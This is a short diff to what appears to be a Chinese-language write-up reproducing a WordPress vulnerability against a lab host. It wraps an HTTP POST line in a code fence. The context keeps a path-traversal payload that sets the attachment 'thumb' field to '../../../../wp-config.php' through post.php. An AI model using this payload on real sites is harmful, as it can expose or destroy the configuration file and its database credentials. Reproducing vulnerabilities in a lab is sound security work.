@@ -193,7 +193,11 @@ http://10.10.10.103/wp-admin/post.php?post=21&action=edit
 
  然后发送post数据包 (需要带入cookie值)
 
+
+```http
 POST /wp-admin/post.php?post=21&action=edit HTTP/1.1
+```
+
 
 payload: action=editattachment&_wpnonce=d8efee3064&thumb=../../../../wp-config.php
 
